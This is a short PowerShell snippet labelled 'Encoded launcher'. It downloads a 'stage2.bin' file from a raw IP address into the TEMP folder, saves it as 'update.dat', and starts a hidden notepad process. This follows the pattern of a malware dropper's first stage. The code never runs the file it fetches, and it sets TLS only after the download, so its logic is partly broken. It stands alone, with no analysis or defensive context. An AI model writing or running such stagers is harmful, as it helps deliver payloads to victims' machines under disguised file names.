# Encoded launcher
try { $Stage1Url = 'http://198.51.100.61/stage2.bin'; $WorkingPath = "$env:TEMP\update.dat"; Invoke-WebRequest -Uri $Stage1Url -OutFile $WorkingPath -UseBasicParsing; Start-Process -FilePath "notepad.exe" -WindowStyle Hidden; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Remote fetch failed" }
